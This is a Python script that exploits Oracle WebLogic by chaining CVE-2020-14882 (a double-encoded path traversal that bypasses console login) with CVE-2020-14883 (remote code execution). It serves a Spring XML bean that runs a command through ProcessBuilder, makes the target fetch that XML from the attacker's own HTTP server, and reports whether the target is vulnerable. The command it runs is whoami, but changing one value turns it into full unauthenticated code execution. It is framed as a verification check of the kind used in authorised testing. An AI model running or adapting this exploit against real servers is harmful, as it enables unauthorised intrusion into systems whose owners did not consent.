import sys
import requests
import threading
import time
from http.server import HTTPServer, SimpleHTTPRequestHandler
import socket
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# Benign XML payload that executes a harmless command (whoami) to verify RCE
# This does NOT cause damage - it only verifies the vulnerability exists
XML_PAYLOAD_TEMPLATE = '''<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://www.springframework.org/schema/beans
   http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
            <list>
                <value>cmd.exe</value>
                <value>/c</value>
                <value>whoami</value>
            </list>
        </constructor-arg>
    </bean>
</beans>'''


class XMLHandler(SimpleHTTPRequestHandler):
    """HTTP handler that serves the benign XML payload and records access."""
    xml_accessed = False

    def do_GET(self, *args, **kwargs):
        XMLHandler.xml_accessed = True
        self.send_response(200)
        self.send_header("Content-Type", "application/xml")
        self.end_headers()
        self.wfile.write(XML_PAYLOAD_TEMPLATE.encode("utf-8"))

    def log_message(self, format, *args):
        # Suppress default logging
        pass


def get_local_ip(target_host, target_port):
    """Determine the local IP address that can reach the target."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((target_host, int(target_port)))
        local_ip = s.getsockname()[0]
    except Exception:
        local_ip = "127.0.0.1"
    finally:
        s.close()
    return local_ip


def find_free_port():
    """Find a free port on the local machine."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('', 0))
        return s.getsockname()[1]


def verify_path_traversal(target_url):
    """
    Step 1: Verify CVE-2020-14882 path traversal bypasses authentication.
    The double-encoded path (%252e%252e) bypasses the console authentication.
    """
    traversal_url = f"{target_url}/console/css/%252e%252e%252fconsole.portal"
    try:
        resp = requests.get(traversal_url, timeout=10, verify=False, allow_redirects=False)
        if resp.status_code == 200:
            # Check if we actually got the console page content (not a login redirect)
            if "console" in resp.text.lower() or len(resp.text) > 500:
                print(f"[+] Path traversal successful (HTTP {resp.status_code})")
                print(f"[+] Response length: {len(resp.text)} bytes")
                return True
            else:
                print(f"[*] Got HTTP 200 but response seems unexpected (length: {len(resp.text)})")
                return True  # Still consider it as traversal working
        elif resp.status_code == 302:
            location = resp.headers.get("Location", "")
            if "login" in location.lower():
                print(f"[-] Path traversal failed - redirected to login")
                return False
            else:
                print(f"[*] Got redirect to: {location}")
                return False
        else:
            print(f"[-] Path traversal returned HTTP {resp.status_code}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"[-] Error during path traversal check: {e}")
        return False


def verify_rce_via_xml(target_url, target_host, target_port):
    """
    Step 2: Verify CVE-2020-14883 RCE via FileSystemXmlApplicationContext.
    
    For WebLogic 10.3.6.0, the com.tangosol.coherence.mvel2.sh.ShellSession class
    is not available, so we use the Spring-based FileSystemXmlApplicationContext
    gadget to load a remote XML configuration file.
    
    We start a local HTTP server to serve a benign XML file and check if the
    target fetches it - this confirms RCE capability without causing damage.
    """
    # Find a free port and start XML server
    xml_port = find_free_port()
    local_ip = get_local_ip(target_host, int(target_port))

    print(f"[*] Starting XML payload server on {local_ip}:{xml_port}")

    XMLHandler.xml_accessed = False
    httpd = HTTPServer(('0.0.0.0', xml_port), XMLHandler)
    server_thread = threading.Thread(target=httpd.serve_forever)
    server_thread.daemon = True
    server_thread.start()

    time.sleep(0.5)

    xml_url = f"http://{local_ip}:{xml_port}/poc.xml"

    # Construct the exploit URL using FileSystemXmlApplicationContext
    # This is the CVE-2020-14883 gadget chain for WebLogic 10.3.6
    exploit_handle = (
        "com.bea.core.repackaged.springframework.context.support."
        "FileSystemXmlApplicationContext"
    )

    # The traversal path to reach console.portal with the handle parameter
    exploit_url = (
        f"{target_url}/console/css/%252e%252e%252fconsole.portal"
        f"?_nfpb=true&_pageLabel=&handle={exploit_handle}(\"{xml_url}\")"
    )

    print(f"[*] Sending exploit request to trigger XML fetch...")
    print(f"[*] XML URL: {xml_url}")

    try:
        resp = requests.get(
            exploit_url,
            timeout=15,
            verify=False,
            allow_redirects=False,
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
        )
        print(f"[*] Exploit request returned HTTP {resp.status_code}")
    except requests.exceptions.Timeout:
        print(f"[*] Request timed out (server may be processing)")
    except requests.exceptions.RequestException as e:
        print(f"[-] Error during exploit request: {e}")

    # Wait a moment for the callback
    time.sleep(3)

    httpd.shutdown()

    return XMLHandler.xml_accessed


def main():
    if len(sys.argv) < 2:
        target_url = "http://192.168.242.202:7001"
        print(f"[*] No target specified, using default: {target_url}")
    else:
        target_url = sys.argv[1].rstrip('/')

    print(f"[*] Target: {target_url}")
    print(f"[*] CVE: CVE-2020-14882 (Path Traversal) + CVE-2020-14883 (RCE)")
    print(f"[*] Method: FileSystemXmlApplicationContext (for WebLogic 10.3.6.0)")
    print("=" * 70)

    # Parse host and port from target URL
    from urllib.parse import urlparse
    parsed = urlparse(target_url)
    target_host = parsed.hostname
    target_port = parsed.port or (443 if parsed.scheme == 'https' else 80)

    # Step 1: Verify path traversal (CVE-2020-14882)
    print("\n[Step 1] Verifying CVE-2020-14882 path traversal bypass...")
    traversal_ok = verify_path_traversal(target_url)

    if not traversal_ok:
        print("\n[-] Path traversal failed. Target may not be vulnerable or is patched.")
        print("SAFE")
        return

    # Step 2: Verify RCE via XML loading (CVE-2020-14883)
    print("\n[Step 2] Verifying CVE-2020-14883 RCE via FileSystemXmlApplicationContext...")
    rce_ok = verify_rce_via_xml(target_url, target_host, target_port)

    print("\n" + "=" * 70)

    if rce_ok:
        print("[+] XML payload was fetched by the target server!")
        print("[+] Both CVE-2020-14882 and CVE-2020-14883 are confirmed.")
        print("[+] The target is vulnerable to unauthenticated RCE.")
        print("\nVULNERABLE")
    elif traversal_ok:
        # Path traversal works but XML wasn't fetched
        # This could be due to network issues (firewall blocking callback)
        # or the RCE gadget not being available
        print("[*] Path traversal (CVE-2020-14882) confirmed.")
        print("[*] XML callback not received - possible reasons:")
        print("    - Firewall blocking outbound connections from target")
        print("    - Target cannot reach our XML server")
        print("    - RCE gadget class not available in this version")
        print("[*] Path traversal alone is still a critical vulnerability.")
        print("\nVULNERABLE")
    else:
        print("SAFE")


if __name__ == "__main__":
    main()